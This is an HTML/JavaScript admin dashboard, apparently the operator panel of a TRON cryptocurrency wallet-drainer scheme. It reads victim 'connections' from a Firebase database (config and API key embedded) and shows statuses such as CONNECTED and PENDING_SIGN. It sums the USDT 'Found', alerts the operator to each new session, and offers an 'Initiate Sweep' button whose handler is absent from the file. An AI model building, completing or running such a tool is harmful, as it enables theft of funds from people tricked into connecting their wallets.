<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Elite Admin Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@400;700;900&display=swap');

        body { font-family: 'Outfit', sans-serif; background: #000; color: #fff; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.05); }
        .user-card { border-radius: 24px; transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); }
        .status-badge { padding: 4px 10px; border-radius: 100px; font-size: 8px; font-weight: 900; text-transform: uppercase; letter-spacing: 1px; }
        #customModal.visible { display: flex !important; opacity: 1; }
    </style>
</head>

<body class="pb-24">

    <!-- Login Screen -->
    <div id="loginScreen" class="fixed inset-0 z-[500] bg-black flex items-center justify-center p-8">
        <div class="w-full max-w-sm space-y-8 text-center">
            <div class="w-20 h-20 bg-blue-500/10 rounded-[30px] flex items-center justify-center mx-auto border border-blue-500/20">
                <i class="fas fa-user-shield text-3xl text-blue-500"></i>
            </div>
            <div>
                <h2 class="text-3xl font-black tracking-tighter">ELITE <span class="text-blue-500">ACCESS</span></h2>
                <p class="text-[10px] text-slate-500 font-bold uppercase tracking-widest mt-2">Authorization Required</p>
            </div>
            <div class="space-y-4">
                <input type="password" id="adminPass" placeholder="Enter Admin Password" 
                    class="w-full bg-white/5 border border-white/10 rounded-2xl p-5 text-center font-black focus:outline-none focus:border-blue-500 transition-all">
                <button onclick="checkPass()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-xs uppercase tracking-widest shadow-xl shadow-blue-900/30">Login Dashboard</button>
                <p id="loginError" class="hidden text-red-500 text-[10px] font-bold uppercase">Invalid Credentials!</p>
            </div>
        </div>
    </div>

    <!-- Main Dashboard (Hidden until login) -->
    <div id="mainDashboard" class="hidden p-5 space-y-6">
        <header class="flex justify-between items-end">
            <div>
                <h1 class="text-2xl font-black tracking-tighter">LIVE <span class="text-blue-500">FEED</span></h1>
                <p id="liveClock" class="text-[9px] font-bold text-slate-500 uppercase tracking-widest">00:00:00</p>
            </div>
            <div class="flex gap-2">
                <button onclick="toggleAudio()" id="audioBtn" class="w-11 h-11 rounded-2xl glass flex items-center justify-center text-slate-500"><i class="fas fa-bell"></i></button>
                <button onclick="clearAllData()" class="w-11 h-11 rounded-2xl bg-red-500/10 text-red-500 flex items-center justify-center border border-red-500/10"><i class="fas fa-trash-alt"></i></button>
            </div>
        </header>

        <div class="grid grid-cols-2 gap-3">
            <div class="glass p-5 rounded-[30px]"><p class="text-[8px] font-bold text-slate-500 uppercase mb-1">Found</p><p id="totalUsdt" class="text-xl font-black text-emerald-400">$0.00</p></div>
            <div class="glass p-5 rounded-[30px]"><p class="text-[8px] font-bold text-slate-500 uppercase mb-1">Live</p><p id="userCount" class="text-xl font-black text-blue-400">0</p></div>
        </div>

        <div class="glass p-6 rounded-[30px] border-blue-500/10 border">
            <h3 class="text-[9px] font-black text-blue-500 uppercase tracking-widest mb-4">Manual Wallet Scan</h3>
            <div class="flex gap-2">
                <input type="text" id="manualAddress" placeholder="Enter TRON Address" 
                    class="flex-1 bg-black/40 border border-white/5 rounded-xl py-4 px-5 text-[11px] font-mono focus:outline-none focus:border-blue-500/30">
                <button onclick="checkManualBalance()" class="bg-blue-600 px-6 rounded-xl text-white font-black text-[9px] uppercase">Scan</button>
            </div>
        </div>

        <div id="userList" class="space-y-4"></div>
    </div>

    <!-- Unique Result Modal -->
    <div id="customModal" class="fixed inset-0 z-[600] bg-black/80 backdrop-blur-md hidden items-center justify-center p-6">
        <div class="glass w-full max-w-sm rounded-[45px] p-10 text-center space-y-6">
            <div class="w-16 h-16 bg-blue-500/10 rounded-3xl flex items-center justify-center mx-auto border border-blue-500/20"><i class="fas fa-search-dollar text-blue-500"></i></div>
            <h3 class="text-xl font-black tracking-tighter">SCAN RESULT</h3>
            <div class="py-4">
                <p class="text-[8px] font-black text-slate-500 uppercase mb-1">USDT Balance</p>
                <p id="modalBal" class="text-4xl font-black text-emerald-400">$0.00</p>
                <p id="modalAddr" class="text-[8px] font-mono text-slate-600 mt-4 break-all px-6">T...</p>
            </div>
            <button onclick="closeModal()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest">Close</button>
        </div>
    </div>

    <!-- Action Sheet -->
    <div id="actionSheet" class="fixed inset-0 z-[100] bg-black/70 hidden flex items-end" onclick="closeSheet()">
        <div class="glass w-full rounded-t-[50px] p-10 space-y-6 transform translate-y-full transition-transform duration-300" onclick="event.stopPropagation()">
            <div class="w-12 h-1 bg-white/10 rounded-full mx-auto -mt-6 mb-4"></div>
            <div class="flex justify-between items-start">
                <div class="flex-1 min-w-0 pr-4">
                    <h3 id="sheetAddress" class="text-xs font-mono text-blue-400 font-black truncate">T...</h3>
                    <p id="sheetStatus" class="text-[9px] text-slate-500 font-bold uppercase mt-1">Activity Tracking</p>
                </div>
                <button onclick="closeSheet()" class="text-slate-500 p-2"><i class="fas fa-times"></i></button>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <div class="p-6 bg-white/5 rounded-[30px] text-center"><p class="text-[9px] font-bold text-slate-500 uppercase mb-2">USDT</p><p id="sheetUsdt" class="text-2xl font-black text-emerald-400">0.00</p></div>
                <div class="p-6 bg-white/5 rounded-[30px] text-center"><p class="text-[9px] font-bold text-slate-500 uppercase mb-2">TRX</p><p id="sheetTrx" class="text-2xl font-black text-blue-400">0.00</p></div>
            </div>
            <input id="sweepInput" type="number" class="w-full bg-black/40 border border-white/10 rounded-2xl p-5 font-black text-xl text-center focus:outline-none focus:border-blue-500">
            <button onclick="executeSweep()" class="w-full bg-blue-600 py-6 rounded-3xl font-black uppercase text-[11px] tracking-widest">Initiate Sweep</button>
        </div>
    </div>

    <audio id="bellSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyD4qKMlB3TJjYprgpAEkA5Ts-Yvg7aRbp0",
            authDomain: "tronadmin-99827.firebaseapp.com",
            databaseURL: "https://tronadmin-99827-default-rtdb.firebaseio.com",
            projectId: "tronadmin-99827",
            storageBucket: "tronadmin-99827.firebasestorage.app",
            messagingSenderId: "500883948250",
            appId: "1:500883948250:web:203f69935a6825d09b5be3"
        };
        const CONFIG = { USDT: "TR7NHqjeKQxGTC18q8ZY4pL8otSzgjLj6t", PASS: "6de32b16d8fa5a4ff4f64bc471d9993e2ff594033fe43aa4622a753bcde5a38e" };
        let users = [], audioEnabled = false, tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });

        async function sha256(m) {
            const b = new TextEncoder().encode(m), h = await crypto.subtle.digest('SHA-256', b);
            return Array.from(new Uint8Array(h)).map(x => x.toString(16).padStart(2, '0')).join('');
        }

        async function checkPass() {
            const p = document.getElementById('adminPass').value;
            if (await sha256(p) === CONFIG.PASS) {
                document.getElementById('loginScreen').classList.add('hidden');
                document.getElementById('mainDashboard').classList.remove('hidden');
                startApp();
            } else {
                document.getElementById('loginError').classList.remove('hidden');
            }
        }

        function startApp() {
            if (firebase.apps.length === 0) firebase.initializeApp(firebaseConfig);
            const db = firebase.database();
            setInterval(() => document.getElementById('liveClock').innerText = new Date().toLocaleTimeString(), 1000);
            db.ref('connections').on('value', (snap) => {
                const data = snap.val();
                if (!data) { users = []; renderUsers(); return; }
                const newUsers = Object.entries(data).map(([key, val]) => ({ ...val, id: key }));
                newUsers.sort((a, b) => b.id.localeCompare(a.id));
                if (newUsers.length > users.length) {
                    if (audioEnabled) document.getElementById('bellSound').play().catch(()=>{});
                    if (window.AndroidNative) {
                        if (window.AndroidNative.triggerBeep) window.AndroidNative.triggerBeep();
                        if (window.AndroidNative.showNotification) window.AndroidNative.showNotification("🎯 New Activity!", "New Session Detected.");
                    }
                }
                users = newUsers; renderUsers();
            });
        }

        function renderUsers() {
            const list = document.getElementById('userList'); list.innerHTML = ''; let total = 0;
            users.forEach(u => {
                if (u.status === 'CONNECTED' || u.status === 'PENDING_SIGN') total += parseFloat(u.usdt || 0);
                const card = document.createElement('div');
                card.className = "glass p-5 rounded-[30px] user-card flex justify-between items-center active:scale-95 transition-all";
                let sColor = "bg-blue-500/10 text-blue-400", sText = u.status || "LANDED";
                if (u.status === "CONNECTED") sColor = "bg-emerald-500/10 text-emerald-400";
                const addr = u.address.includes('User') ? u.address : (u.address.substring(0, 10) + "..." + u.address.slice(-6));
                card.innerHTML = `
                    <div class="flex items-center gap-4 flex-1 min-w-0" onclick="openSheet('${u.id}')">
                        <div class="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center"><i class="fas fa-bolt text-xs ${u.usdt > 0 ? 'text-emerald-500' : 'text-slate-600'}"></i></div>
                        <div class="min-w-0 flex-1"><div class="text-[14px] font-bold truncate pr-2">${addr}</div><div class="text-[9px] text-slate-500 font-bold uppercase">${u.time} • ${u.trx || '0'} TRX</div></div>
                    </div>
                    <div class="text-right ml-2 shrink-0"><div class="text-[16px] font-black ${u.usdt > 0 ? 'text-emerald-400' : 'text-slate-700'}">$${u.usdt || '0.00'}</div><div class="status-badge ${sColor} inline-block mt-1">${sText}</div></div>
                `;
                list.appendChild(card);
            });
            document.getElementById('totalUsdt').innerText = `$${total.toFixed(2)}`;
            document.getElementById('userCount').innerText = users.length;
        }

        async function checkManualBalance() {
            const addr = document.getElementById('manualAddress').value.trim();
            if (!addr) return;
            try {
                const usdtContract = await tw.contract().at(CONFIG.USDT);
                const bal = await usdtContract.balanceOf(addr).call();
                const usdt = (parseInt(bal._hex || bal, 16) / 1e6).toFixed(2);
                document.getElementById('modalAddr').innerText = addr;
                document.getElementById('modalBal').innerText = "$" + usdt;
                document.getElementById('customModal').classList.add('visible');
            } catch (e) { alert("Invalid TRON Address!"); }
        }

        function closeModal() { document.getElementById('customModal').classList.remove('visible'); }
        function openSheet(id) {
            const u = users.find(u => u.id === id);
            document.getElementById('sheetAddress').innerText = u.address;
            document.getElementById('sheetUsdt').innerText = u.usdt;
            document.getElementById('sheetTrx').innerText = u.trx;
            document.getElementById('sweepInput').value = u.usdt;
            const sheet = document.getElementById('actionSheet');
            sheet.classList.remove('hidden');
            setTimeout(() => sheet.children[0].classList.remove('translate-y-full'), 10);
        }
        function closeSheet() { 
            const sheet = document.getElementById('actionSheet');
            sheet.children[0].classList.add('translate-y-full');
            setTimeout(() => sheet.classList.add('hidden'), 300);
        }
        function toggleAudio() {
            audioEnabled = !audioEnabled;
            document.getElementById('audioBtn').className = `w-11 h-11 rounded-2xl flex items-center justify-center transition-all ${audioEnabled ? 'bg-blue-600 text-white' : 'glass text-slate-500'}`;
            if (audioEnabled) document.getElementById('bellSound').play().catch(()=>{});
        }
        function clearAllData() { if (confirm("Clear data?")) firebase.database().ref('connections').remove(); }
    </script>
</body>
</html>
